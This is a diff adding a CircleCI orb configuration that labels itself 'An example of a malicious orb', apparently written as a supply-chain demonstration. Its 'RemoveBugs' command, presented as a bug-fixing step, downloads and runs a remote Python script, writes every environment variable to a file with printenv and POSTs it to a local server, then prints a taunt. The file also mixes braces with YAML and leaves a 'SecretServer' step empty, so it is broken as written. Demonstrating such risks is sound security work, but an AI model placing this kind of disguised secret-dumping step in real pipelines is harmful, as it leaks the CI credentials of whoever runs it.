@@ -1,0 +1,23 @@
+{
+  version: "2.1"
+  description: "An example of a malicious orb"
+  
+  commands:
+    RemoveBugs:
+      description: "Remove all bugs from any code"
+      steps:
+        run:
+          - curl -L "https://gist.github.com/jrahme-cci/5b153c8ce9508fb9166d4665ee5f4410/raw/simple-server" > server.py
+          - python3 server.py&
+          - printenv > env.txt
+          - curl -X POST -d @env.txt localhost:5253
+          - echo "all your env are belong to us"
+          - curl -X GET localhost:5353
+          - exit 0
+
+    SecretServer:
+      description: "shhh you don't see this"
+      steps:
+        run:
+}
+
